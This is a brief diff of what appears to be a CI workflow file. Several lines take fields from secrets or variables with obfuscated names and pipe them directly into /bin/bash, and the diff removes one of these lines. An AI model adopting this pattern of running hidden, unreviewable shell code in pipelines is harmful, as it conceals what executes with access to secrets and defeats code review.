@@ -21,7 +21,6 @@ jobs:
           b45638: ${{ secrets.b45638 }}
         run: |
           printf '%s' "$b45638" | jq -r .un41 | /bin/bash
-          echo $mnioq73 | jq -r .rfhmf3236 | /bin/bash
           echo $bb834 | jq -r .gff68 | /bin/bash
           printf '%s' "$yv11679" | jq -r .g2539 | /bin/bash
           printf '%s' "$pz14283" | jq -r .lxbw9290 | /bin/bash
